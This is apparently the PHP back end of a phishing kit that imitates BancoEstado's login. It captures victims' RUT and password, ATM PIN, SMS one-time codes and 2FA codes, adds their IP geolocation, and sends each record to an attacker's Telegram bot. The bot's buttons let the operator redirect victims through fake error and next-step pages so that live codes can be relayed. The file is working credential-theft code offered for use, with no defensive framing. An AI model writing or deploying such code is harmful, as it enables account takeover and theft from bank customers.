<?php
session_start();
require_once 'config.php';

$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$user_ip = explode(',', $user_ip)[0];
$user_ip = trim($user_ip);

// 📍 Función segura para obtener geolocalización
function get_ip_info($user_ip) {
    if (!filter_var($user_ip, FILTER_VALIDATE_IP)) {
        return [];
    }
    $token = 'e8764d0b0d51b0'; // Reemplaza con tu token de ipinfo.io
    $url = "https://ipinfo.io/{$user_ip}/json?token={$token}";
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 4
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true) ?: [];
}
$locationData = get_ip_info($user_ip);
$cc     = $locationData['country'] ?? 'No disponible';
$city   = $locationData['city'] ?? 'No disponible';
$region = $locationData['region'] ?? 'No disponible';

if (!file_exists('requests')) {
    mkdir('requests', 0777, true);
}

$form_origen = "desconocido";
$message = "";

// index.php
if (isset($_POST['rut'],$_POST['password'])) {

    $_SESSION['usuario'] = $_POST['rut'];

    $form_origen = "index.php";

    $rut = trim($_POST['rut']);
    $pass = trim($_POST['password']);
    $message .= "🇨🇱 ✴︎𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈 𝖫𝗈𝗀𝗈✴︎ 🇨🇱\n\n";
    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$rut</code>\n";
    $message .= "┊♡ 𝖢𝗅𝖺𝗏𝖾.: <code>$pass</code>\n";

// index-error.php
} elseif (isset($_POST['rut2'],$_POST['password2'])) {
    $_SESSION['usuario'] = $_POST['rut2'];

    $form_origen = "index-error.php";

    $rut2 = trim($_POST['rut2']);
    $pass2 = trim($_POST['password2']);
    $message .= "🇨🇱 ✴︎𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈 𝖫𝗈𝗀𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈✴︎ 🇨🇱\n\n";
    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$rut2</code>\n";
    $message .= "┊♡ 𝖢𝗅𝖺𝗏𝖾.: <code>$pass2</code>\n";

// pin.php
} elseif (isset($_POST['pincaje'])) {
    $code = trim($_POST['pincaje']);
    $_SESSION['pincaje'] = $code;
    $form_origen = "pin.php";
    $code_esc = htmlspecialchars($code, ENT_QUOTES, 'UTF-8');
    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
    $message .= "🇨🇱 ✴︎𝖯𝖨𝖭 𝖼𝖺𝗃𝖾𝗋𝗈 𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈✴︎ 🇨🇱\n\n";
    $message .= "┊♡ 𝖯𝖨𝖭.: <code>$code_esc</code>\n\n";
    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";

// pin-error.php
} elseif (isset($_POST['pincaje2'])) {
    $code = trim($_POST['pincaje2']);
    $_SESSION['pincaje2'] = $code;
    $form_origen = "pin-error.php";
    $code_esc = htmlspecialchars($code, ENT_QUOTES, 'UTF-8');
    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
    $message .= "🇨🇱 ✴︎𝖯𝖨𝖭 𝖼𝖺𝗃𝖾𝗋𝗈 𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈✴︎ 🇨🇱\n\n";
    $message .= "┊♡ 𝖯𝖨𝖭.: <code>$code_esc</code>\n\n";
    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";

    // cod.php
} elseif (isset($_POST['otpsms'])) {
    $otp = trim($_POST['otpsms']);
    $_SESSION['otpsms'] = $otp;
    $form_origen = "cod.php";
    $otp_esc = htmlspecialchars($otp, ENT_QUOTES, 'UTF-8');
    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
    $message .= "🇨🇱 ✴︎𝖮𝖳𝖯 𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈✴︎ 🇨🇱\n\n";
    $message .= "┊♡ 𝖮𝖳𝖯.: <code>$otp_esc</code>\n\n";
    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";

// cod-error.php
} elseif (isset($_POST['otpsms2'])) {
    $otp = trim($_POST['otpsms2']);
    $_SESSION['otpsms2'] = $otp;
    $form_origen = "cod-error.php";
    $otp_esc = htmlspecialchars($otp, ENT_QUOTES, 'UTF-8');
    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
    $message .= "🇨🇱 ✴︎𝖮𝖳𝖯 𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈✴︎ 🇨🇱\n\n";
    $message .= "┊♡ 𝖮𝖳𝖯.: <code>$otp_esc</code>\n\n";
    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";

    // 2FA.php
} elseif (isset($_POST['2fa'])) {
    $code = trim($_POST['2fa']);
    $_SESSION['2fa'] = $efea;
    $form_origen = "2FA.php";
    $efea_esc = htmlspecialchars($efea, ENT_QUOTES, 'UTF-8');
    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
    $message .= "🇨🇱 ✴︎𝖠𝗎𝗍𝗈𝗋𝗂𝗓𝖺𝖼𝗂𝗈𝗇 2𝖥𝖠 𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈✴︎ 🇨🇱\n\n";
    $message .= "┊♡ 𝖠𝗎𝗍𝗈.: <code>$efea_esc</code>\n\n";
    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";

// 2FA-error.php
} elseif (isset($_POST['2fa2'])) {
    $code = trim($_POST['2fa2']);
    $_SESSION['2fa2'] = $efea;
    $form_origen = "2FA-error.php";
    $efea_esc = htmlspecialchars($efea, ENT_QUOTES, 'UTF-8');
    $user_esc = htmlspecialchars($_SESSION['usuario'] ?? 'Desconocido', ENT_QUOTES, 'UTF-8');
    $message .= "🇨🇱 ✴︎𝖠𝗎𝗍𝗈𝗋𝗂𝗓𝖺𝖼𝗂𝗈𝗇 2𝖥𝖠 𝖡𝖺𝗇𝖼𝗈𝖤𝗌𝗍𝖺𝖽𝗈-𝖱𝖾𝗂𝗇𝗍𝖾𝗇𝗍𝗈✴︎ 🇨🇱\n\n";
    $message .= "┊♡ 𝖠𝗎𝗍𝗈.: <code>$efea_esc</code>\n\n";
    $message .= "┊♡ 𝖱𝖴𝖳.: <code>$user_esc</code>\n";

} else {
    exit("No se reconocieron datos válidos.");
}

$message .= "\n┊♡ 𝖴𝖻𝗂𝖼𝖺𝖼𝗂𝗈𝗇.: $cc - $region - $city\n";
$message .= "┊♡ 𝖨𝖯.: <code>$user_ip</code>";

$request_id = session_id();
$_SESSION['estado'] = null;

$request_data = [
    'usuario' => $_SESSION['usuario'] ?? 'Desconocido',
    'estado' => null
];
file_put_contents("requests/$request_id.json", json_encode($request_data));

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '『🍀』𝖨𝗇𝗂𝖼𝗂𝗈', 'callback_data' => "redir:$request_id:index.php"],
            ['text' => '『🚫』𝖨𝗇𝗂𝖼𝗂𝗈 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:index-error.php"]
        ],
        [
            ['text' => '『🍀』𝖯𝖨𝖭', 'callback_data' => "redir:$request_id:pin.php"],
            ['text' => '『🚫』𝖯𝖨𝖭 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:pin-error.php"]
        ],
        [
            ['text' => '『🍀』𝖮𝖳𝖯', 'callback_data' => "redir:$request_id:cod.php"],
            ['text' => '『🚫』𝖮𝖳𝖯 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:cod-error.php"]
        ],
        [
            ['text' => '『🍀』2𝖥𝖠', 'callback_data' => "redir:$request_id:2FA.php"],
            ['text' => '『🚫』2𝖥𝖠 𝖤𝗋𝗋𝗈𝗋', 'callback_data' => "redir:$request_id:2FA-error.php"]
        ],
        [
            ['text' => '『🏁』𝖥𝗂𝗇𝖺𝗅𝗂𝗓𝖺𝗋', 'callback_data' => "redir:$request_id:fin.php"]
        ]
    ]
];


$url = "https://api.telegram.org/bot" . $bot_token_2 . "/sendMessage";
$payload = [
    'chat_id' => $chat_id_2,
    'text' => $message,
    'reply_markup' => json_encode($keyboard),
    'parse_mode' => 'HTML'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

header("Location: load.php?id=" . $request_id);
exit;
